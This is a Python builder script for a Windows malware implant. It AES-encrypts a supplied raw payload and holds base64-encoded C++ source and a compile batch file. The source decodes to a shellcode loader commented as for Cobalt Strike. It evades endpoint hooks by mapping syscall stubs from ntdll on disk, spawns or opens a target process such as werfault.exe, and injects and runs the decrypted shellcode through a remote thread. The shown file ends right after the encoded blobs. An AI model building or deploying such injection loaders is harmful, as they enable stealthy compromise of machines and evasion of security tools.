import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib
import subprocess
import base64 as b64
import os

KEY = urandom(16)

def pad(s):
	return s.decode('latin-1') + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv.encode('latin'))

	return cipher.encrypt(bytes(plaintext.encode('latin')))

def replace_text(file_text, encoded_text, placeholder):
	return file_text.replace(placeholder.encode(), encoded_text.encode())


def main():
	try:
	    payload_text = open(sys.argv[1], "rb").read()
	except:
	    print("File argument needed! %s <raw payload file>" % sys.argv[0])
	    sys.exit()

	NtOpenProc = "NtOpenProcess"
	NtAllocVirtMem = "NtAllocateVirtualMemory"
	NtWriteVirtMem = "NtWriteVirtualMemory"
	NtProtVirtMem = "NtProtectVirtualMemory"
	NtCreateThrEx = "NtCreateThreadEx"

	# Base64 encoded source files and compile script
	b64_implant_template_cpp = "ICAKI2luY2x1ZGUgPGlvc3RyZWFtPgojaW5jbHVkZSA8d2ludGVybmwuaD4KI2luY2x1ZGUgPHdpbmRvd3MuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8dGxoZWxwMzIuaD4KI2luY2x1ZGUgPHdpbmNyeXB0Lmg+CiNwcmFnbWEgY29tbWVudCAobGliLCAiY3J5cHQzMi5saWIiKQojcHJhZ21hIGNvbW1lbnQgKGxpYiwgImFkdmFwaTMyIikKCiNpbmNsdWRlICJzdHJ1Y3RzLmgiCiNpbmNsdWRlICJoZWxwZXJzLmgiCiNkZWZpbmUgU1RBVFVTX1NVQ0NFU1MgMAoKLyogVGhlIGNvZGUgZm9yIDogUlZBdG9SYXdPZmZzZXQsIE1hcFN5c2NhbGwsIEVzdGFibGlzaFN5c2NhbGxzIGlzIG1vc3RseSBmcm9tIGh0dHBzOi8vd3d3LmlyZWQudGVhbS9vZmZlbnNpdmUtc2VjdXJpdHkvZGVmZW5zZS1ldmFzaW9uL3JldHJpZXZpbmctbnRkbGwtc3lzY2FsbC1zdHVicy1hdC1ydW4tdGltZQoJCglJbiB0ZXN0aW5nIHdlIHJhbiBpbnRvIHNvbWUgb2RkIGlzc3VlcyB3aXRoIG1zZnZlbm9tIHBheWxvYWRzIHRoYXQgd2VyZSBlbmNvZGVkLiAgRGlkbid0IGJvdGhlciB0byBkaWcgaW50byBpdCwgd29ya3MgZmluZSB3aXRoIHZhcmlvdXMgb3BlcmF0aW9uYWwgdG9vbHNldHMgdGhhdCB3ZSB0ZXN0ZWQKKi8KCi8vIENvYmFsdCBTdHJpa2UgU2hlbGxjb2RlCnVuc2lnbmVkIGNoYXIgc2hlbGxjb2RlW10gPSBbRU5DT0RFRF9QQVlMT0FEXQp1bnNpZ25lZCBjaGFyIGtleVtdID0gW0FFU0tFWV0KCnVuc2lnbmVkIGludCBzaGVsbGNvZGVfbGVuID0gc2l6ZW9mKHNoZWxsY29kZSk7CgoKaW50IGNvbnN0IFNZU0NBTExfU1RVQl9TSVpFID0gMjE7CgpNeU50T3BlblByb2Nlc3MgX050T3BlblByb2Nlc3MgPSBOVUxMOwpjaGFyIE9wZW5Qcm9jU3R1YltTWVNDQUxMX1NUVUJfU0laRV0gPSB7fTsKCk15TnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnkgX050QWxsb2NhdGVWaXJ0dWFsTWVtb3J5ID0gTlVMTDsKY2hhciBBbGxvY1N0dWJbU1lTQ0FMTF9TVFVCX1NJWkVdID0ge307CgpNeU50V3JpdGVWaXJ0dWFsTWVtb3J5IF9OdFdyaXRlVmlydHVhbE1lbW9yeSA9IE5VTEw7CmNoYXIgV1ZNU3R1YltTWVNDQUxMX1NUVUJfU0laRV0gPSB7fTsKCk15TnRQcm90ZWN0VmlydHVhbE1lbW9yeSBfTnRQcm90ZWN0VmlydHVhbE1lbW9yeSA9IE5VTEw7CmNoYXIgUHJvdGVjdFN0dWJbU1lTQ0FMTF9TVFVCX1NJWkVdID0ge307CgpNeU50Q3JlYXRlVGhyZWFkRXggX050Q3JlYXRlVGhyZWFkRXggPSBOVUxMOwpjaGFyIENyZWF0ZVRocmVhZEV4U3R1YltTWVNDQUxMX1NUVUJfU0laRV07CgppbnQgQUVTRGVjcnlwdChjaGFyKiBwYXlsb2FkLCB1bnNpZ25lZCBpbnQgcGF5bG9hZF9sZW4sIGNoYXIqIGtleSwgc2l6ZV90IGtleWxlbikgewoJSENSWVBUUFJPViBoUHJvdjsKCUhDUllQVEhBU0ggaEhhc2g7CglIQ1JZUFRLRVkgaEtleTsKCglpZiAoIUNyeXB0QWNxdWlyZUNvbnRleHRXKCZoUHJvdiwgTlVMTCwgTlVMTCwgUFJPVl9SU0FfQUVTLCBDUllQVF9WRVJJRllDT05URVhUKSkgewoJCXJldHVybiAtMTsKCX0KCWlmICghQ3J5cHRDcmVhdGVIYXNoKGhQcm92LCBDQUxHX1NIQV8yNTYsIDAsIDAsICZoSGFzaCkpIHsKCQlyZXR1cm4gLTE7Cgl9CglpZiAoIUNyeXB0SGFzaERhdGEoaEhhc2gsIChCWVRFKilrZXksIChEV09SRClrZXlsZW4sIDApKSB7CgkJcmV0dXJuIC0xOwoJfQoJaWYgKCFDcnlwdERlcml2ZUtleShoUHJvdiwgQ0FMR19BRVNfMjU2LCBoSGFzaCwgMCwgJmhLZXkpKSB7CgkJcmV0dXJuIC0xOwoJfQoKCWlmICghQ3J5cHREZWNyeXB0KGhLZXksIChIQ1JZUFRIQVNIKU5VTEwsIDAsIDAsIChCWVRFKilwYXlsb2FkLCAoRFdPUkQqKSZwYXlsb2FkX2xlbikpIHsKCQlyZXR1cm4gLTE7Cgl9CgoJQ3J5cHRSZWxlYXNlQ29udGV4dChoUHJvdiwgMCk7CglDcnlwdERlc3Ryb3lIYXNoKGhIYXNoKTsKCUNyeXB0RGVzdHJveUtleShoS2V5KTsKCglyZXR1cm4gMDsKfQoKUFZPSUQgUlZBdG9SYXdPZmZzZXQoRFdPUkRfUFRSIFJWQSwgUElNQUdFX1NFQ1RJT05fSEVBREVSIHNlY3Rpb24pCnsKCXJldHVybiAoUFZPSUQpKFJWQSAtIHNlY3Rpb24tPlZpcnR1YWxBZGRyZXNzICsgc2VjdGlvbi0+UG9pbnRlclRvUmF3RGF0YSk7Cn0KCkJPT0wgTWFwU3lzY2FsbChMUENTVFIgZnVuY3Rpb25OYW1lLCBQSU1BR0VfRVhQT1JUX0RJUkVDVE9SWSBleHBvcnREaXJlY3RvcnksIExQVk9JRCBmaWxlRGF0YSwgUElNQUdFX1NFQ1RJT05fSEVBREVSIHRleHRTZWN0aW9uLCBQSU1BR0VfU0VDVElPTl9IRUFERVIgcmRhdGFTZWN0aW9uLCBMUFZPSUQgc3lzY2FsbFN0dWIpCnsKCVBEV09SRCBhZGRyZXNzT2ZOYW1lcyA9IChQRFdPUkQpUlZBdG9SYXdPZmZzZXQoKERXT1JEX1BUUilmaWxlRGF0YSArICooJmV4cG9ydERpcmVjdG9yeS0+QWRkcmVzc09mTmFtZXMpLCByZGF0YVNlY3Rpb24pOwoJUERXT1JEIGFkZHJlc3NPZkZ1bmN0aW9ucyA9IChQRFdPUkQpUlZBdG9SYXdPZmZzZXQoKERXT1JEX1BUUilmaWxlRGF0YSArICooJmV4cG9ydERpcmVjdG9yeS0+QWRkcmVzc09mRnVuY3Rpb25zKSwgcmRhdGFTZWN0aW9uKTsKCglmb3IgKHNpemVfdCBpID0gMDsgaSA8IGV4cG9ydERpcmVjdG9yeS0+TnVtYmVyT2ZOYW1lczsgaSsrKQoJewoJCURXT1JEX1BUUiBmdW5jdGlvbk5hbWVWQSA9IChEV09SRF9QVFIpUlZBdG9SYXdPZmZzZXQoKERXT1JEX1BUUilmaWxlRGF0YSArIGFkZHJlc3NPZk5hbWVzW2ldLCByZGF0YVNlY3Rpb24pOwoJCURXT1JEX1BUUiBmdW5jdGlvblZBID0gKERXT1JEX1BUUilSVkF0b1Jhd09mZnNldCgoRFdPUkRfUFRSKWZpbGVEYXRhICsgYWRkcmVzc09mRnVuY3Rpb25zW2kgKyAxXSwgdGV4dFNlY3Rpb24pOwoJCUxQQ1NUUiBmdW5jdGlvbk5hbWVSZXNvbHZlZCA9IChMUENTVFIpZnVuY3Rpb25OYW1lVkE7CgkJaWYgKHN0cmNtcChmdW5jdGlvbk5hbWVSZXNvbHZlZCwgZnVuY3Rpb25OYW1lKSA9PSAwKQoJCXsKCQkJbWVtY3B5KHN5c2NhbGxTdHViLCAoTFBWT0lEKWZ1bmN0aW9uVkEsIFNZU0NBTExfU1RVQl9TSVpFKTsKCQkJcmV0dXJuIFRSVUU7CgkJfQoJfQoKCXJldHVybiBGQUxTRTsKfQoKCkJPT0wgRmluZE9wZW5Qcm9jKFBJTUFHRV9FWFBPUlRfRElSRUNUT1JZIGV4cG9ydERpcmVjdG9yeSwgTFBWT0lEIGZpbGVEYXRhLCBQSU1BR0VfU0VDVElPTl9IRUFERVIgdGV4dFNlY3Rpb24sIFBJTUFHRV9TRUNUSU9OX0hFQURFUiByZGF0YVNlY3Rpb24pCnsKCURXT1JEIG9sZFByb3RlY3Rpb247CglfTnRPcGVuUHJvY2VzcyA9IChNeU50T3BlblByb2Nlc3MpKExQVk9JRClPcGVuUHJvY1N0dWI7CglCT09MIHN0YXR1cyA9IFZpcnR1YWxQcm90ZWN0KE9wZW5Qcm9jU3R1YiwgU1lTQ0FMTF9TVFVCX1NJWkUsIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUsICZvbGRQcm90ZWN0aW9uKTsKCgl1bnNpZ25lZCBjaGFyIHNOdE9wZW5Qcm9jW10gPSBbRU5DT0RFRF9OVE9QRU5QUk9DXQoKCUFFU0RlY3J5cHQoKGNoYXIgKikgc050T3BlblByb2MsIHNpemVvZihzTnRPcGVuUHJvYyksIChjaGFyICopIGtleSwgc2l6ZW9mKGtleSkpOwoKCWlmIChNYXBTeXNjYWxsKChMUENTVFIpc050T3BlblByb2MsIGV4cG9ydERpcmVjdG9yeSwgZmlsZURhdGEsIHRleHRTZWN0aW9uLCByZGF0YVNlY3Rpb24sIE9wZW5Qcm9jU3R1YikpCgl7CgkJcmV0dXJuIFRSVUU7Cgl9CgoJcmV0dXJuIEZBTFNFOwp9CkhBTkRMRSBDYWxsT3BlblByb2MoRFdPUkQgcGlkKQp7CgkvLyB2YXJpYWJsZXMgZm9yIE50T3BlblByb2Nlc3MKCUhBTkRMRSBoUHJvY2VzcyA9IE5VTEw7CglPQkpFQ1RfQVRUUklCVVRFUyB6b2E7CglJbml0aWFsaXplT2JqZWN0QXR0cmlidXRlcygmem9hLCBOVUxMLCBOVUxMLCBOVUxMLCBOVUxMLCBOVUxMKTsKCUNMSUVOVF9JRCB0YXJnZXRQaWQgPSB7IDAgfTsKCXRhcmdldFBpZC5VbmlxdWVQcm9jZXNzID0gKHZvaWQqKXBpZDsKCU5UU1RBVFVTIHN1Y2Nlc3MgPSBOVUxMOwoJc3VjY2VzcyA9IF9OdE9wZW5Qcm9jZXNzKCZoUHJvY2VzcywgUFJPQ0VTU19BTExfQUNDRVNTLCAmem9hLCAmdGFyZ2V0UGlkKTsKCWlmIChzdWNjZXNzICE9IDApCgkJcmV0dXJuIE5VTEw7CgoJcmV0dXJuIGhQcm9jZXNzOwp9CkJPT0wgRmluZEFsbG9jKFBJTUFHRV9FWFBPUlRfRElSRUNUT1JZIGV4cG9ydERpcmVjdG9yeSwgTFBWT0lEIGZpbGVEYXRhLCBQSU1BR0VfU0VDVElPTl9IRUFERVIgdGV4dFNlY3Rpb24sIFBJTUFHRV9TRUNUSU9OX0hFQURFUiByZGF0YVNlY3Rpb24pCnsKCURXT1JEIG9sZFByb3RlY3Rpb247CglfTnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnkgPSAoTXlOdEFsbG9jYXRlVmlydHVhbE1lbW9yeSkoTFBWT0lEKUFsbG9jU3R1YjsKCVZpcnR1YWxQcm90ZWN0KEFsbG9jU3R1YiwgU1lTQ0FMTF9TVFVCX1NJWkUsIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUsICZvbGRQcm90ZWN0aW9uKTsKCgl1bnNpZ25lZCBjaGFyIHNOdEFsbG9jVmlydE1lbVtdID0gW0VOQ09ERURfTlRBTExPQ1ZJUlRNRU1dCgoJQUVTRGVjcnlwdCgoY2hhciAqKSBzTnRBbGxvY1ZpcnRNZW0sIHNpemVvZihzTnRBbGxvY1ZpcnRNZW0pLCAoY2hhciAqKSBrZXksIHNpemVvZihrZXkpKTsKCglpZiAoTWFwU3lzY2FsbCgoTFBDU1RSKXNOdEFsbG9jVmlydE1lbSwgZXhwb3J0RGlyZWN0b3J5LCBmaWxlRGF0YSwgdGV4dFNlY3Rpb24sIHJkYXRhU2VjdGlvbiwgQWxsb2NTdHViKSkKCXsKCQlyZXR1cm4gVFJVRTsKCX0KCXJldHVybiBGQUxTRTsKfQoKQk9PTCBGaW5kV3JpdGVWaXJ0dWFsTWVtb3J5KFBJTUFHRV9FWFBPUlRfRElSRUNUT1JZIGV4cG9ydERpcmVjdG9yeSwgTFBWT0lEIGZpbGVEYXRhLCBQSU1BR0VfU0VDVElPTl9IRUFERVIgdGV4dFNlY3Rpb24sIFBJTUFHRV9TRUNUSU9OX0hFQURFUiByZGF0YVNlY3Rpb24pCnsKCURXT1JEIG9sZFByb3RlY3Rpb247CglfTnRXcml0ZVZpcnR1YWxNZW1vcnkgPSAoTXlOdFdyaXRlVmlydHVhbE1lbW9yeSkoTFBWT0lEKVdWTVN0dWI7CglWaXJ0dWFsUHJvdGVjdChXVk1TdHViLCBTWVNDQUxMX1NUVUJfU0laRSwgUEFHRV9FWEVDVVRFX1JFQURXUklURSwgJm9sZFByb3RlY3Rpb24pOwoKCXVuc2lnbmVkIGNoYXIgc050V3JpdGVWaXJ0TWVtW10gPSBbRU5DT0RFRF9OVFdSSVRFVklSVE1FTV0KCglBRVNEZWNyeXB0KChjaGFyICopIHNOdFdyaXRlVmlydE1lbSwgc2l6ZW9mKHNOdFdyaXRlVmlydE1lbSksIChjaGFyICopIGtleSwgc2l6ZW9mKGtleSkpOwoKCWlmIChNYXBTeXNjYWxsKChMUENTVFIpc050V3JpdGVWaXJ0TWVtLCBleHBvcnREaXJlY3RvcnksIGZpbGVEYXRhLCB0ZXh0U2VjdGlvbiwgcmRhdGFTZWN0aW9uLCBXVk1TdHViKSkKCXsKCQlyZXR1cm4gVFJVRTsKCX0KCXJldHVybiBGQUxTRTsKfQpCT09MIEZpbmRQcm90ZWN0VmlydHVhbE1lbW9yeShQSU1BR0VfRVhQT1JUX0RJUkVDVE9SWSBleHBvcnREaXJlY3RvcnksIExQVk9JRCBmaWxlRGF0YSwgUElNQUdFX1NFQ1RJT05fSEVBREVSIHRleHRTZWN0aW9uLCBQSU1BR0VfU0VDVElPTl9IRUFERVIgcmRhdGFTZWN0aW9uKQp7CgoJRFdPUkQgb2xkUHJvdGVjdGlvbjsKCV9OdFByb3RlY3RWaXJ0dWFsTWVtb3J5ID0gKE15TnRQcm90ZWN0VmlydHVhbE1lbW9yeSkoTFBWT0lEKVByb3RlY3RTdHViOwoJVmlydHVhbFByb3RlY3QoUHJvdGVjdFN0dWIsIFNZU0NBTExfU1RVQl9TSVpFLCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFLCAmb2xkUHJvdGVjdGlvbik7CgoJdW5zaWduZWQgY2hhciBzTnRQcm90VmlydE1lbVtdID0gW0VOQ09ERURfTlRQUk9UVklSVE1FTV0KCglBRVNEZWNyeXB0KChjaGFyICopIHNOdFByb3RWaXJ0TWVtLCBzaXplb2Yoc050UHJvdFZpcnRNZW0pLCAoY2hhciAqKSBrZXksIHNpemVvZihrZXkpKTsKCglpZiAoTWFwU3lzY2FsbCgoTFBDU1RSKXNOdFByb3RWaXJ0TWVtLCBleHBvcnREaXJlY3RvcnksIGZpbGVEYXRhLCB0ZXh0U2VjdGlvbiwgcmRhdGFTZWN0aW9uLCBQcm90ZWN0U3R1YikpCgl7CgkJcmV0dXJuIFRSVUU7Cgl9CglyZXR1cm4gRkFMU0U7Cn0KCgpCT09MIEZpbmRDcmVhdGVUaHJlYWRFeChQSU1BR0VfRVhQT1JUX0RJUkVDVE9SWSBleHBvcnREaXJlY3RvcnksIExQVk9JRCBmaWxlRGF0YSwgUElNQUdFX1NFQ1RJT05fSEVBREVSIHRleHRTZWN0aW9uLCBQSU1BR0VfU0VDVElPTl9IRUFERVIgcmRhdGFTZWN0aW9uKQp7CglEV09SRCBvbGRQcm90ZWN0aW9uOwoJX050Q3JlYXRlVGhyZWFkRXggPSAoTXlOdENyZWF0ZVRocmVhZEV4KShMUFZPSUQpQ3JlYXRlVGhyZWFkRXhTdHViOwoJVmlydHVhbFByb3RlY3QoQ3JlYXRlVGhyZWFkRXhTdHViLCBTWVNDQUxMX1NUVUJfU0laRSwgUEFHRV9FWEVDVVRFX1JFQURXUklURSwgJm9sZFByb3RlY3Rpb24pOwoKCXVuc2lnbmVkIGNoYXIgc050Q3JlYXRlVGhyRXhbXSA9IFtFTkNPREVEX05UQ1JFQVRFVEhSRVhdCgoJQUVTRGVjcnlwdCgoY2hhciAqKSBzTnRDcmVhdGVUaHJFeCwgc2l6ZW9mKHNOdENyZWF0ZVRockV4KSwgKGNoYXIgKikga2V5LCBzaXplb2Yoa2V5KSk7CgoJaWYgKE1hcFN5c2NhbGwoKExQQ1NUUilzTnRDcmVhdGVUaHJFeCwgZXhwb3J0RGlyZWN0b3J5LCBmaWxlRGF0YSwgdGV4dFNlY3Rpb24sIHJkYXRhU2VjdGlvbiwgQ3JlYXRlVGhyZWFkRXhTdHViKSkKCXsKCQlyZXR1cm4gVFJVRTsKCX0KCglyZXR1cm4gRkFMU0U7Cn0KCgpCT09MIEVzdGFibGlzaFN5c2NhbGxzKCkKewoJTFBWT0lEIGZpbGVEYXRhID0gTlVMTDsKCUhBTkRMRSBmaWxlID0gTlVMTDsKCURXT1JEIGZpbGVTaXplID0gTlVMTDsKCURXT1JEIGJ5dGVzUmVhZCA9IE5VTEw7CglCT09MIHN1Y2Nlc3MgPSBUUlVFOwoKCWZpbGUgPSBDcmVhdGVGaWxlQSgiYzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxudGRsbC5kbGwiLCBHRU5FUklDX1JFQUQsIEZJTEVfU0hBUkVfUkVBRCwgTlVMTCwgT1BFTl9FWElTVElORywgRklMRV9BVFRSSUJVVEVfTk9STUFMLCBOVUxMKTsKCWZpbGVTaXplID0gR2V0RmlsZVNpemUoZmlsZSwgTlVMTCk7CglmaWxlRGF0YSA9IEhlYXBBbGxvYyhHZXRQcm9jZXNzSGVhcCgpLCAwLCBmaWxlU2l6ZSk7CglpZiAoIVJlYWRGaWxlKGZpbGUsIGZpbGVEYXRhLCBmaWxlU2l6ZSwgJmJ5dGVzUmVhZCwgTlVMTCkpCgkJcmV0dXJuIEZBTFNFOwoKCVBJTUFHRV9ET1NfSEVBREVSIGRvc0hlYWRlciA9IChQSU1BR0VfRE9TX0hFQURFUilmaWxlRGF0YTsKCVBJTUFHRV9OVF9IRUFERVJTIGltYWdlTlRIZWFkZXJzID0gKFBJTUFHRV9OVF9IRUFERVJTKSgoRFdPUkRfUFRSKWZpbGVEYXRhICsgZG9zSGVhZGVyLT5lX2xmYW5ldyk7CglEV09SRCBleHBvcnREaXJSVkEgPSBpbWFnZU5USGVhZGVycy0+T3B0aW9uYWxIZWFkZXIuRGF0YURpcmVjdG9yeVtJTUFHRV9ESVJFQ1RPUllfRU5UUllfRVhQT1JUXS5WaXJ0dWFsQWRkcmVzczsKCVBJTUFHRV9TRUNUSU9OX0hFQURFUiBzZWN0aW9uID0gSU1BR0VfRklSU1RfU0VDVElPTihpbWFnZU5USGVhZGVycyk7CglQSU1BR0VfU0VDVElPTl9IRUFERVIgdGV4dFNlY3Rpb24gPSBzZWN0aW9uOwoJUElNQUdFX1NFQ1RJT05fSEVBREVSIHJkYXRhU2VjdGlvbiA9IHNlY3Rpb247CgoJZm9yIChpbnQgaSA9IDA7IGkgPCBpbWFnZU5USGVhZGVycy0+RmlsZUhlYWRlci5OdW1iZXJPZlNlY3Rpb25zOyBpKyspCgl7CgkJaWYgKHN0cmNtcCgoQ0hBUiopc2VjdGlvbi0+TmFtZSwgKENIQVIqKSIucmRhdGEiKSA9PSAwKSB7CgkJCXJkYXRhU2VjdGlvbiA9IHNlY3Rpb247CgkJCWJyZWFrOwoJCX0KCQlzZWN0aW9uKys7Cgl9CgoJUElNQUdFX0VYUE9SVF9ESVJFQ1RPUlkgZXhwb3J0RGlyZWN0b3J5ID0gKFBJTUFHRV9FWFBPUlRfRElSRUNUT1JZKVJWQXRvUmF3T2Zmc2V0KChEV09SRF9QVFIpZmlsZURhdGEgKyBleHBvcnREaXJSVkEsIHJkYXRhU2VjdGlvbik7CgoJLy8gQXNzaWduIFN5c2NhbGwgdmFsdWVzCglpZiAoIUZpbmRPcGVuUHJvYyhleHBvcnREaXJlY3RvcnksIGZpbGVEYXRhLCB0ZXh0U2VjdGlvbiwgcmRhdGFTZWN0aW9uKSkKCQlzdWNjZXNzID0gRkFMU0U7CglpZiAoIUZpbmRBbGxvYyhleHBvcnREaXJlY3RvcnksIGZpbGVEYXRhLCB0ZXh0U2VjdGlvbiwgcmRhdGFTZWN0aW9uKSkKCQlzdWNjZXNzID0gRkFMU0U7CglpZiAoIUZpbmRXcml0ZVZpcnR1YWxNZW1vcnkoZXhwb3J0RGlyZWN0b3J5LCBmaWxlRGF0YSwgdGV4dFNlY3Rpb24sIHJkYXRhU2VjdGlvbikpCgkJc3VjY2VzcyA9IEZBTFNFOwoJaWYgKCFGaW5kUHJvdGVjdFZpcnR1YWxNZW1vcnkoZXhwb3J0RGlyZWN0b3J5LCBmaWxlRGF0YSwgdGV4dFNlY3Rpb24sIHJkYXRhU2VjdGlvbikpCgkJc3VjY2VzcyA9IEZBTFNFOwoJaWYgKCFGaW5kQ3JlYXRlVGhyZWFkRXgoZXhwb3J0RGlyZWN0b3J5LCBmaWxlRGF0YSwgdGV4dFNlY3Rpb24sIHJkYXRhU2VjdGlvbikpCgkJc3VjY2VzcyA9IEZBTFNFOwoKCglpZiAoZmlsZSkKCXsKCQlDbG9zZUhhbmRsZShmaWxlKTsKCQlmaWxlID0gTlVMTDsKCX0KCglpZiAoc3VjY2VzcykKCQlyZXR1cm4gVFJVRTsKCglyZXR1cm4gRkFMU0U7Cgp9CgoKaW50IG1haW4oaW50IGFyZ2MsIGNoYXIqIGFyZ3ZbXSkKewoJSEFORExFIGhQcm9jID0gSU5WQUxJRF9IQU5ETEVfVkFMVUU7CglIQU5ETEUgaFJlbW90ZVRocmVhZCA9IElOVkFMSURfSEFORExFX1ZBTFVFOwoJTFBWT0lEIGxwQWxsb2NhdGlvblN0YXJ0ID0gbnVsbHB0cjsKCVNJWkVfVCBzekFsbG9jYXRpb24gPSBzaXplb2Ygc2hlbGxjb2RlOwoJRFdPUkQgb2xkUHJvdGVjdDsKCglTVEFSVFVQSU5GTyBzaTsKICAgIFBST0NFU1NfSU5GT1JNQVRJT04gcGk7CiAgICBMUENXU1RSIGNtZDsKICAgIERXT1JEIHByb2NJZDsKCiAgICBaZXJvTWVtb3J5KCZzaSwgc2l6ZW9mKHNpKSk7CglaZXJvTWVtb3J5KCZwaSwgc2l6ZW9mKHBpKSk7CglzaS5jYiA9IHNpemVvZihzaSk7CgkKCWlmIChhcmdjIDwgMikKCXsKCQljbWQgPSAoTFBDV1NUUikiQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFx3ZXJmYXVsdC5leGUiOwoJICAgIHByaW50ZigiQ3JlYXRpbmcgc3VzcGVuZGVkIHdlcmZhdWx0LmV4ZSBwcm9jZXNzLi4uXG4iKTsKCSAgICBpZiAoIUNyZWF0ZVByb2Nlc3MoKExQQ1NUUiljbWQsIE5VTEwsIE5VTEwsIE5VTEwsIEZBTFNFLCBDUkVBVEVfU1VTUEVOREVEIHwgQ1JFQVRFX05PX1dJTkRPVywgTlVMTCwgTlVMTCwgJnNpLCAmcGkpKSB7CgkgICAgICAgIGV4aXQoMSk7CgkgICAgfQoKICAgIAlwcm9jSWQgPSBwaS5kd1Byb2Nlc3NJZDsKICAgIH0KICAgIGVsc2UgewogICAgCXByb2NJZCA9IHN0ZDo6YXRvaShhcmd2WzFdKTsKICAgIH0KCglpZiAoIUVzdGFibGlzaFN5c2NhbGxzKCkpCgkJcmV0dXJuIDE7CgoJcHJpbnRmKCJPcGVuaW5nIHRhcmdldCBwcm9jZXNzIHdpdGggUElEICVkXG4iLCBwcm9jSWQpOwoJaFByb2MgPSBDYWxsT3BlblByb2MocHJvY0lkKTsKCWlmIChoUHJvYyA9PSBJTlZBTElEX0hBTkRMRV9WQUxVRSkgewoJCXByaW50ZigiRmFpbGVkIHRvIG9wZW4gdGFyZ2V0IHByb2Nlc3NcbiIpOwoJCXJldHVybiBGQUxTRTsKCX0KCglwcmludGYoIkFsbG9jYXRpbmcgJWQgYnl0ZXNcbiIsIHN6QWxsb2NhdGlvbik7CglOVFNUQVRVUyBzdGF0dXMgPSBfTnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnkoaFByb2MsICZscEFsbG9jYXRpb25TdGFydCwgMCwgJnN6QWxsb2NhdGlvbiwgTUVNX0NPTU1JVCB8IE1FTV9SRVNFUlZFLCBQQUdFX1JFQURXUklURSk7CglpZiAoc3RhdHVzICE9IFNUQVRVU19TVUNDRVNTKQoJewoJCXByaW50ZigiRmFpbGVkIHRvIGFsbG9jYXRlIG1lbW9yeVxuIik7CgkJcmV0dXJuIEZBTFNFOwoJfQoKCS8vIERlY3J5cHQgcGF5bG9hZCBiZWZvcmUgaW5qZWN0aW5nCglBRVNEZWNyeXB0KChjaGFyKilzaGVsbGNvZGUsIHNoZWxsY29kZV9sZW4sIChjaGFyKilrZXksIHNpemVvZihrZXkpKTsKCglwcmludGYoIldyaXRpbmcgc2hlbGxjb2RlIHRvIDB4JXBcbiIsIGxwQWxsb2NhdGlvblN0YXJ0KTsKCXN0YXR1cyA9IF9OdFdyaXRlVmlydHVhbE1lbW9yeShoUHJvYywgbHBBbGxvY2F0aW9uU3RhcnQsIChQVk9JRClzaGVsbGNvZGUsIHN6QWxsb2NhdGlvbiwgTlVMTCk7CglpZiAoc3RhdHVzICE9IFNUQVRVU19TVUNDRVNTKQoJewoJCXByaW50ZigiRmFpbGVkIHRvIHdyaXRlIHRvIGFsbG9jYXRlZCBtZW1vcnlcbiIpOwoJCXJldHVybiBGQUxTRTsKCX0KCglwcmludGYoIkNoYW5naW5nIG1lbW9yeSBwZXJtaXNzaW9uc1xuIik7CglzdGF0dXMgPSBfTnRQcm90ZWN0VmlydHVhbE1lbW9yeShoUHJvYywgJmxwQWxsb2NhdGlvblN0YXJ0LCAmc3pBbGxvY2F0aW9uLCBQQUdFX0VYRUNVVEVfUkVBRCwgJm9sZFByb3RlY3QpOwoJaWYgKHN0YXR1cyAhPSBTVEFUVVNfU1VDQ0VTUykKCXsKCQlwcmludGYoIlVuYWJsZSB0byBjaGFuZ2UgbWVtb3J5IHBlcm1pc3Npb25zXG4iKTsKCQlyZXR1cm4gRkFMU0U7Cgl9CgoJcHJpbnRmKCJDcmVhdGluZyByZW1vdGUgdGhyZWFkXG4iKTsKCXN0YXR1cyA9IF9OdENyZWF0ZVRocmVhZEV4KCZoUmVtb3RlVGhyZWFkLCBQUk9DRVNTX0FMTF9BQ0NFU1MsIE5VTEwsIGhQcm9jLAoJCShMUFRIUkVBRF9TVEFSVF9ST1VUSU5FKWxwQWxsb2NhdGlvblN0YXJ0LCBOVUxMLCBGQUxTRSwgMCwgMCwgMCwgTlVMTCk7CgoKCWlmIChoUmVtb3RlVGhyZWFkKQoJCUNsb3NlSGFuZGxlKGhSZW1vdGVUaHJlYWQpOwoJaWYgKGhQcm9jKQoJCUNsb3NlSGFuZGxlKGhQcm9jKTsKCglpZiAoc3RhdHVzICE9IFNUQVRVU19TVUNDRVNTKQoJewoJCXByaW50ZigiQ3JlYXRlUmVtb3RlVGhyZWFkIGZhaWxlZFxuIik7CgkJcmV0dXJuIEZBTFNFOwoJfQoKCglwcmludGYoIlN1Y2Nlc3MhIik7CglyZXR1cm4gMDsKfQ=="
	b64_compile_bat = "QEVDSE8gT0ZGCgpjbC5leGUgL25vbG9nbyAvT3ggL01UIC9XMCAvR1MtIC9ETkRFQlVHIC9UcCBzcmNcXCouY3BwIC9saW5rIC9PVVQ6aW1wbGFudC5leGUgL1NVQlNZU1RFTTpDT05TT0xFCnJlbSBDbGVhbmluZyB1cC4uLgpkZWwgKi5vYmo="
